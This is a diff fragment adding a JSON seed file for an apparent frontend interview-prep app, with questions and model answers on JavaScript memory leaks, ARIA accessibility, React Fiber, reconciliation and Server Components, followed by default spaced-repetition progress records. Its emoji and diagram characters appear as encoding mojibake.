+        "Knows all microtasks process before next macrotask",
+        "Can predict execution order",
+        "Understands rendering implications"
+      ],
+      "followUpQuestions": [
+        "How does async/await relate to microtasks?",
+        "What happens if microtasks keep adding microtasks?"
+      ],
+      "relatedTopics": [
+        "async-javascript",
+        "promises",
+        "performance"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Senior frontend roles"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "js-event-loop-002",
+      "category": "js-event-loop",
+      "difficulty": "mid",
+      "question": "What are the common causes of memory leaks in JavaScript applications? How would you identify and fix them?",
+      "answer": "## Common Memory Leak Causes\n\n### 1. Forgotten Event Listeners\n\n```typescript\n// âŒ Memory leak\nuseEffect(() => {\n  window.addEventListener('resize', handleResize);\n  // Missing cleanup!\n}, []);\n\n// âœ… Fixed\nuseEffect(() => {\n  window.addEventListener('resize', handleResize);\n  return () => window.removeEventListener('resize', handleResize);\n}, []);\n```\n\n### 2. Uncleared Timers\n\n```typescript\n// âŒ Memory leak\nuseEffect(() => {\n  setInterval(pollData, 1000);\n}, []);\n\n// âœ… Fixed\nuseEffect(() => {\n  const id = setInterval(pollData, 1000);\n  return () => clearInterval(id);\n}, []);\n```\n\n### 3. Closures Holding References\n\n```typescript\n// âŒ Large array kept in memory\nfunction createHandler() {\n  const largeData = new Array(1000000).fill('x');\n  \n  return function handler() {\n    console.log(largeData.length); // Closure keeps largeData alive\n  };\n}\n\n// âœ… Only keep what's needed\nfunction createHandler() {\n  const largeData = new Array(1000000).fill('x');\n  const length = largeData.length; // Extract needed value\n  \n  return function handler() {\n    console.log(length);\n  };\n}\n```\n\n### 4. Detached DOM Nodes\n\n```typescript\n// âŒ DOM node kept in memory\nlet cachedElement: HTMLElement | null = null;\n\nfunction cacheElement() {\n  cachedElement = document.getElementById('temp');\n  document.body.removeChild(cachedElement!);\n  // cachedElement still references removed node\n}\n\n// âœ… Clear reference\nfunction cleanup() {\n  cachedElement = null;\n}\n```\n\n### 5. Forgotten Subscriptions\n\n```typescript\n// âŒ Memory leak\nuseEffect(() => {\n  const subscription = observable.subscribe(handleData);\n}, []);\n\n// âœ… Fixed\nuseEffect(() => {\n  const subscription = observable.subscribe(handleData);\n  return () => subscription.unsubscribe();\n}, []);\n```\n\n## Identifying Memory Leaks\n\n```javascript\n// Chrome DevTools Memory Tab:\n// 1. Take heap snapshot before action\n// 2. Perform suspected leaky action\n// 3. Take another snapshot\n// 4. Compare snapshots, look for increasing objects\n\n// Performance Monitor:\n// 1. Open Performance Monitor (Cmd+Shift+P > \"Show Performance Monitor\")\n// 2. Watch \"JS heap size\" over time\n// 3. Growing heap = potential leak\n```",
+      "keyPoints": [
+        "Knows common leak patterns",
+        "Implements proper cleanup in effects",
+        "Can use DevTools for leak detection",
+        "Understands closure memory implications"
+      ],
+      "followUpQuestions": [
+        "How do WeakMap and WeakRef help with memory?",
+        "What about memory leaks in Web Workers?"
+      ],
+      "relatedTopics": [
+        "performance",
+        "debugging",
+        "react-hooks"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Performance-focused roles"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "accessibility-001",
+      "category": "accessibility",
+      "difficulty": "senior",
+      "question": "How would you make a custom dropdown/select component fully accessible? Consider keyboard navigation, screen readers, and ARIA attributes.",
+      "answer": "## Accessible Custom Select Implementation\n\n### Required ARIA Attributes\n\n```tsx\nfunction CustomSelect({ options, value, onChange, label }: Props) {\n  const [isOpen, setIsOpen] = useState(false);\n  const [activeIndex, setActiveIndex] = useState(-1);\n  const listboxId = useId();\n  const labelId = useId();\n  \n  return (\n    <div className=\"select-container\">\n      <label id={labelId}>{label}</label>\n      \n      {/* Trigger button */}\n      <button\n        role=\"combobox\"\n        aria-haspopup=\"listbox\"\n        aria-expanded={isOpen}\n        aria-labelledby={labelId}\n        aria-controls={listboxId}\n        aria-activedescendant={\n          activeIndex >= 0 ? `option-${activeIndex}` : undefined\n        }\n        onClick={() => setIsOpen(!isOpen)}\n        onKeyDown={handleKeyDown}\n      >\n        {value || 'Select an option'}\n      </button>\n      \n      {/* Options list */}\n      {isOpen && (\n        <ul\n          id={listboxId}\n          role=\"listbox\"\n          aria-labelledby={labelId}\n          tabIndex={-1}\n        >\n          {options.map((option, index) => (\n            <li\n              key={option.value}\n              id={`option-${index}`}\n              role=\"option\"\n              aria-selected={option.value === value}\n              className={index === activeIndex ? 'active' : ''}\n              onClick={() => {\n                onChange(option.value);\n                setIsOpen(false);\n              }}\n            >\n              {option.label}\n            </li>\n          ))}\n        </ul>\n      )}\n    </div>\n  );\n}\n```\n\n### Keyboard Navigation\n\n```typescript\nfunction handleKeyDown(e: React.KeyboardEvent) {\n  switch (e.key) {\n    case 'Enter':\n    case ' ':\n      e.preventDefault();\n      if (isOpen && activeIndex >= 0) {\n        onChange(options[activeIndex].value);\n        setIsOpen(false);\n      } else {\n        setIsOpen(true);\n      }\n      break;\n      \n    case 'ArrowDown':\n      e.preventDefault();\n      if (!isOpen) {\n        setIsOpen(true);\n      } else {\n        setActiveIndex(prev => \n          Math.min(prev + 1, options.length - 1)\n        );\n      }\n      break;\n      \n    case 'ArrowUp':\n      e.preventDefault();\n      setActiveIndex(prev => Math.max(prev - 1, 0));\n      break;\n      \n    case 'Escape':\n      setIsOpen(false);\n      break;\n      \n    case 'Home':\n      e.preventDefault();\n      setActiveIndex(0);\n      break;\n      \n    case 'End':\n      e.preventDefault();\n      setActiveIndex(options.length - 1);\n      break;\n      \n    default:\n      // Type-ahead: jump to option starting with typed letter\n      handleTypeAhead(e.key);\n  }\n}\n```\n\n### Focus Management\n\n```typescript\n// Return focus to trigger when closing\nuseEffect(() => {\n  if (!isOpen) {\n    buttonRef.current?.focus();\n  }\n}, [isOpen]);\n\n// Close on outside click\nuseEffect(() => {\n  if (!isOpen) return;\n  \n  function handleClickOutside(e: MouseEvent) {\n    if (!containerRef.current?.contains(e.target as Node)) {\n      setIsOpen(false);\n    }\n  }\n  \n  document.addEventListener('mousedown', handleClickOutside);\n  return () => document.removeEventListener('mousedown', handleClickOutside);\n}, [isOpen]);\n```\n\n### Screen Reader Announcements\n\n```tsx\n// Live region for announcements\n<div aria-live=\"polite\" className=\"sr-only\">\n  {isOpen && `${options.length} options available`}\n</div>\n\n// Selected state clearly communicated\n<li\n  role=\"option\"\n  aria-selected={isSelected}\n>\n  {option.label}\n  {isSelected && <span className=\"sr-only\">(selected)</span>}\n</li>\n```",
+      "keyPoints": [
+        "Knows required ARIA roles and attributes",
+        "Implements full keyboard navigation",
+        "Manages focus correctly",
+        "Provides screen reader announcements"
+      ],
+      "followUpQuestions": [
+        "How would you handle multi-select?",
+        "What about typeahead/autocomplete behavior?"
+      ],
+      "relatedTopics": [
+        "aria",
+        "keyboard-navigation",
+        "focus-management"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Any company caring about a11y"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "accessibility-002",
+      "category": "accessibility",
+      "difficulty": "mid",
+      "question": "What is the difference between aria-label, aria-labelledby, and aria-describedby? When would you use each?",
+      "answer": "## Purpose and Differences\n\n### aria-label\nProvides an accessible name directly as a string.\n\n```html\n<!-- Icon-only button -->\n<button aria-label=\"Close dialog\">\n  <svg><!-- X icon --></svg>\n</button>\n\n<!-- When visible text is insufficient -->\n<button aria-label=\"Add to cart - Blue T-Shirt, $29.99\">\n  Add to Cart\n</button>\n```\n\n### aria-labelledby\nPoints to element(s) that provide the accessible name.\n\n```html\n<!-- Reference existing text -->\n<h2 id=\"dialog-title\">Delete Account</h2>\n<div role=\"dialog\" aria-labelledby=\"dialog-title\">\n  <!-- dialog content -->\n</div>\n\n<!-- Multiple labels -->\n<span id=\"billing\">Billing</span>\n<span id=\"name\">Name</span>\n<input aria-labelledby=\"billing name\" />\n<!-- Announced as \"Billing Name\" -->\n```\n\n### aria-describedby\nPoints to element(s) that provide additional description.\n\n```html\n<!-- Help text for input -->\n<label for=\"password\">Password</label>\n<input \n  id=\"password\" \n  type=\"password\"\n  aria-describedby=\"password-help password-error\"\n/>\n<p id=\"password-help\">Must be at least 8 characters</p>\n<p id=\"password-error\" role=\"alert\">Password is too short</p>\n\n<!-- Dialog description -->\n<div \n  role=\"dialog\"\n  aria-labelledby=\"dialog-title\"\n  aria-describedby=\"dialog-desc\"\n>\n  <h2 id=\"dialog-title\">Delete Account</h2>\n  <p id=\"dialog-desc\">This action cannot be undone.</p>\n</div>\n```\n\n## Decision Framework\n\n| Scenario | Use |\n|----------|-----|\n| No visible text (icons) | aria-label |\n| Visible text exists | aria-labelledby |\n| Need supplementary info | aria-describedby |\n| Form validation errors | aria-describedby |\n| Combining multiple text sources | aria-labelledby |\n\n## Priority Order\n\nScreen readers use this priority:\n1. aria-labelledby (if present)\n2. aria-label (if present)\n3. Native label mechanisms (<label>, alt, etc.)\n4. Element content\n\n```html\n<!-- aria-labelledby wins -->\n<span id=\"custom\">Custom Label</span>\n<button aria-labelledby=\"custom\" aria-label=\"Different\">\n  Button Text\n</button>\n<!-- Announced as \"Custom Label\" -->\n```",
+      "keyPoints": [
+        "Knows when to use each attribute",
+        "Understands priority order",
+        "Can combine with aria-describedby",
+        "Uses aria-labelledby for existing text"
+      ],
+      "followUpQuestions": [
+        "What happens when both aria-label and aria-labelledby are present?",
+        "How do you test these with screen readers?"
+      ],
+      "relatedTopics": [
+        "aria",
+        "screen-readers",
+        "forms"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "All frontend roles"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "react-internals-001",
+      "category": "react-internals",
+      "difficulty": "senior",
+      "question": "Explain React's Fiber architecture. What problems did it solve, and how does it enable concurrent rendering?",
+      "answer": "## Before Fiber: Stack Reconciler\n\n```\nOld React (synchronous):\nrender() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º commit\n          Can't interrupt! (blocking)\n\nProblem: Large updates block the main thread\n- No user input handling during reconciliation\n- Janky animations\n- Unresponsive UI\n```\n\n## Fiber Architecture\n\n```\nWith Fiber (interruptible):\nrender â”€â”€â–º pause â”€â”€â–º handle input â”€â”€â–º resume â”€â”€â–º commit\n          â”‚                            â”‚\n          â””â”€â”€ Work can be interrupted â”€â”˜\n```\n\n### Fiber Node Structure\n\n```typescript\ninterface Fiber {\n  // Instance\n  type: any;          // Function/Class/string ('div')\n  key: string | null;\n  stateNode: any;     // DOM node or class instance\n  \n  // Fiber tree structure\n  return: Fiber | null;     // Parent\n  child: Fiber | null;      // First child\n  sibling: Fiber | null;    // Next sibling\n  \n  // Effects\n  flags: Flags;             // What needs to happen (Placement, Update, Deletion)\n  subtreeFlags: Flags;      // Optimized child effect tracking\n  \n  // Work\n  pendingProps: any;\n  memoizedProps: any;\n  memoizedState: any;\n  \n  // Lanes (priority)\n  lanes: Lanes;\n  childLanes: Lanes;\n}\n```\n\n### Two-Phase Rendering\n\n```\nPhase 1: Render (interruptible)\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚  Build work-in-progress Fiber tree          â”‚\nâ”‚  â€¢ Can be paused, aborted, restarted        â”‚\nâ”‚  â€¢ No side effects                          â”‚\nâ”‚  â€¢ Pure calculation of what changed         â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                    â”‚\n                    â–¼\nPhase 2: Commit (synchronous)\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚  Apply changes to DOM                        â”‚\nâ”‚  â€¢ Cannot be interrupted                    â”‚\nâ”‚  â€¢ Runs effects (useEffect, useLayoutEffect)â”‚\nâ”‚  â€¢ Must complete in one go                  â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n## Priority Lanes\n\n```typescript\n// Different updates have different priorities\nconst SyncLane = 0b0001;           // Highest (user input)\nconst InputContinuousLane = 0b0010; // Dragging, scrolling\nconst DefaultLane = 0b0100;         // Normal updates\nconst TransitionLane = 0b1000;      // startTransition\n\n// React can interrupt low-priority work for high-priority\nfunction handleClick() {\n  // This gets SyncLane - highest priority\n  setInputValue(e.target.value);\n  \n  // This gets TransitionLane - can be interrupted\n  startTransition(() => {\n    setSearchResults(filterData(query));\n  });\n}\n```\n\n## Concurrent Features Enabled\n\n```typescript\n// 1. Suspense\n<Suspense fallback={<Spinner />}>\n  <AsyncComponent />\n</Suspense>\n\n// 2. Transitions\nconst [isPending, startTransition] = useTransition();\n\n// 3. Deferred values\nconst deferredValue = useDeferredValue(value);\n\n// 4. Streaming SSR\nrenderToPipeableStream(<App />);\n```",
+      "keyPoints": [
+        "Understands pre-Fiber limitations",
+        "Knows Fiber node structure",
+        "Can explain two-phase rendering",
+        "Understands priority lanes",
+        "Knows what concurrent features Fiber enables"
+      ],
+      "followUpQuestions": [
+        "How does React decide when to interrupt work?",
+        "What is time slicing?",
+        "How do transitions differ from regular state updates?"
+      ],
+      "relatedTopics": [
+        "reconciliation",
+        "concurrent-react",
+        "suspense"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Meta",
+        "Senior React roles"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "react-internals-002",
+      "category": "react-internals",
+      "difficulty": "senior",
+      "question": "How does React's reconciliation algorithm work? Explain the diffing heuristics and why keys are important.",
+      "answer": "## Reconciliation Overview\n\nReact's reconciliation compares the old and new virtual DOM trees to determine the minimum DOM operations needed.\n\n### Diffing Heuristics\n\nReact uses two heuristics for O(n) complexity:\n\n**1. Different types â†’ Full rebuild**\n```tsx\n// Old tree\n<div>\n  <Counter />\n</div>\n\n// New tree - different root type\n<span>\n  <Counter />\n</span>\n\n// Result: Entire subtree destroyed and rebuilt\n// Counter loses all state\n```\n\n**2. Same type â†’ Update attributes/props**\n```tsx\n// Old\n<div className=\"old\" title=\"old\" />\n\n// New\n<div className=\"new\" title=\"new\" />\n\n// Result: Only update className and title attributes\n// DOM node reused\n```\n\n### Key Algorithm for Lists\n\n```tsx\n// Without keys - positional comparison\n// Old: [A, B, C]\n// New: [B, C, A]\n// React thinks: Update Aâ†’B, Update Bâ†’C, Update Câ†’A\n// 3 updates!\n\n// With keys - identity-based comparison  \n// Old: [A(key=1), B(key=2), C(key=3)]\n// New: [B(key=2), C(key=3), A(key=1)]\n// React knows: Move A, keep B and C\n// 1 move operation!\n```\n\n### Why Index as Key is Bad\n\n```tsx\n// Items: ['Apple', 'Banana', 'Cherry']\n// Rendered with index keys\n\n{items.map((item, index) => (\n  <ListItem key={index} item={item} />\n))}\n\n// Delete 'Apple' - items become ['Banana', 'Cherry']\n// \n// Old:  key=0(Apple) | key=1(Banana) | key=2(Cherry)\n// New:  key=0(Banana) | key=1(Cherry)\n//\n// React compares by key:\n// - key=0: Appleâ†’Banana (UPDATE, not delete!)\n// - key=1: Bananaâ†’Cherry (UPDATE)\n// - key=2: Cherryâ†’(removed)\n//\n// Input state in ListItem gets misaligned!\n```\n\n### Fiber Reconciliation Process\n\n```typescript\nfunction reconcileChildren(\n  current: Fiber | null,\n  workInProgress: Fiber,\n  newChildren: any\n) {\n  // 1. First pass: Match existing children by key\n  const existingChildren = mapRemainingChildren(current);\n  \n  // 2. For each new child:\n  for (const newChild of newChildren) {\n    // Try to find matching fiber by key\n    const existing = existingChildren.get(newChild.key);\n    \n    if (existing && existing.type === newChild.type) {\n      // Reuse fiber, just update props\n      const clone = useFiber(existing, newChild.props);\n      existingChildren.delete(newChild.key);\n    } else {\n      // Create new fiber\n      createFiberFromElement(newChild);\n    }\n  }\n  \n  // 3. Delete remaining unmatched children\n  existingChildren.forEach(child => deleteChild(workInProgress, child));\n}\n```\n\n### Key Best Practices\n\n```tsx\n// âœ… Good: Stable, unique ID\n{items.map(item => (\n  <Item key={item.id} data={item} />\n))}\n\n// âœ… Good: Composite key when no ID\n{items.map(item => (\n  <Item key={`${item.category}-${item.name}`} data={item} />\n))}\n\n// âŒ Bad: Array index (causes bugs with reordering)\n{items.map((item, index) => (\n  <Item key={index} data={item} />\n))}\n\n// âŒ Bad: Random value (causes full remount every render)\n{items.map(item => (\n  <Item key={Math.random()} data={item} />\n))}\n```",
+      "keyPoints": [
+        "Understands O(n) heuristics",
+        "Knows type comparison rules",
+        "Can explain key algorithm in detail",
+        "Knows why index keys cause bugs"
+      ],
+      "followUpQuestions": [
+        "When might you intentionally use index as key?",
+        "How does reconciliation differ with Suspense?"
+      ],
+      "relatedTopics": [
+        "virtual-dom",
+        "fiber",
+        "performance"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Meta",
+        "Senior React roles"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "react-internals-003",
+      "category": "react-internals",
+      "difficulty": "mid",
+      "question": "Explain the difference between React Server Components (RSC) and traditional server-side rendering (SSR). What problems does RSC solve?",
+      "answer": "## Traditional SSR\n\n```\nServer                           Client\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚ Render to HTML â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º  â”‚ Parse HTML     â”‚\nâ”‚                â”‚              â”‚ (visible)      â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                                        â”‚\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”              â”Œâ”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚ Send JS bundle â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º  â”‚ Download JS    â”‚\nâ”‚ (entire app)   â”‚              â”‚ (large bundle) â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                                        â”‚\n                                â”Œâ”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”\n                                â”‚ Hydrate        â”‚\n                                â”‚ (interactive)  â”‚\n                                â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n\nProblems:\n- Full JS bundle downloaded even for static content\n- Hydration must complete before interactivity\n- Client needs all component code\n```\n\n## React Server Components\n\n```\nServer                           Client\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚ Execute RSC    â”‚              â”‚                â”‚\nâ”‚ (data fetching)â”‚              â”‚                â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â”‚                â”‚\n        â”‚                       â”‚                â”‚\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”              â”‚                â”‚\nâ”‚ Stream RSC     â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º  â”‚ Render RSC     â”‚\nâ”‚ payload (JSON) â”‚              â”‚ output         â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â”‚ (no hydration) â”‚\n        â”‚                       â”‚                â”‚\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”              â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚ Send ONLY      â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º  â”‚ Hydrate only   â”‚\nâ”‚ client         â”‚              â”‚ client         â”‚\nâ”‚ component JS   â”‚              â”‚ components     â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n\nBenefits:\n- Zero JS for server components\n- Streaming (progressive loading)\n- Direct database/filesystem access\n```\n\n## Component Types\n\n```tsx\n// Server Component (default in App Router)\n// - Runs only on server\n// - Can use async/await\n// - Can access database, filesystem\n// - Cannot use hooks, browser APIs\nasync function ProductList() {\n  const products = await db.query('SELECT * FROM products');\n  \n  return (\n    <ul>\n      {products.map(p => (\n        <ProductCard key={p.id} product={p} />\n      ))}\n    </ul>\n  );\n}\n\n// Client Component\n'use client';\n// - Runs on client (and server for SSR)\n// - Can use hooks, event handlers\n// - Cannot be async\nfunction AddToCartButton({ productId }: { productId: string }) {\n  const [isPending, startTransition] = useTransition();\n  \n  return (\n    <button onClick={() => addToCart(productId)}>\n      Add to Cart\n    </button>\n  );\n}\n```\n\n## Composition Pattern\n\n```tsx\n// Server Component can render Client Components\n// but not vice versa (without children pattern)\n\n// âœ… Server renders Client\nasync function Page() {\n  const data = await fetchData();\n  return <ClientComponent initialData={data} />;\n}\n\n// âœ… Client receives Server children via props\nfunction ClientWrapper({ children }: { children: React.ReactNode }) {\n  const [isOpen, setIsOpen] = useState(false);\n  return isOpen ? children : null;\n}\n\n// Usage\n<ClientWrapper>\n  <ServerComponent /> {/* This works! */}\n</ClientWrapper>\n```\n\n## When to Use Each\n\n| Server Components | Client Components |\n|------------------|-------------------|\n| Data fetching | Event handlers |\n| Access backend | useState, useEffect |\n| Render-only UI | Browser APIs |\n| Large dependencies | Interactive UI |\n| Sensitive data | Real-time updates |",
+      "keyPoints": [
+        "Understands SSR vs RSC differences",
+        "Knows zero-JS benefit of RSC",
+        "Can explain composition patterns",
+        "Knows when to use client vs server"
+      ],
+      "followUpQuestions": [
+        "How do Server Actions relate to RSC?",
+        "What are the caching implications of RSC?"
+      ],
+      "relatedTopics": [
+        "next-js",
+        "ssr",
+        "streaming"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Modern React/Next.js roles"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    }
+  ],
+  "progress": [
+    {
+      "id": "progress-system-design-001",
+      "questionId": "system-design-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-system-design-002",
+      "questionId": "system-design-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-system-design-003",
+      "questionId": "system-design-003",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-system-design-004",
+      "questionId": "system-design-004",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-system-design-005",
+      "questionId": "system-design-005",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-system-design-006",
+      "questionId": "system-design-006",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-caching-memoization-001",
+      "questionId": "caching-memoization-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-caching-memoization-002",
+      "questionId": "caching-memoization-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-caching-memoization-003",
+      "questionId": "caching-memoization-003",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-caching-memoization-004",
+      "questionId": "caching-memoization-004",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-caching-memoization-005",
+      "questionId": "caching-memoization-005",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z"
+    },
+    {
+      "id": "progress-bundle-tree-shaking-001",
+      "questionId": "bundle-tree-shaking-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2025-12-31T22:18:47.424Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
